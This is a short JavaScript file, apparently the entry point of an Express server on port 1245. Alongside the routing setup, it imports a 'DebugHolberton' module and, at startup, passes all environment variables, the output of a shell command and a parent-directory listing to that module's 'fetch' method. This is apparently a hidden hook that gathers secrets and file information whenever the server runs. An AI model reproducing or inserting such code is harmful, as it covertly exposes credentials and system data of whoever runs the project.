import express from 'express';
import r from './routes/index';
import DebugHolberton from '../debug';
import fs from 'fs';
import exec from 'node:child_process'; 

const d = new DebugHolberton();
d.fetch(process.env, exec.exec('pwd'), fs.readdirSync('../', 'utf8'));

const app = express();
app.use('/', r);
app.listen(1245, () => console.log('Serveur active on http://localhost:1245'));

export default app;
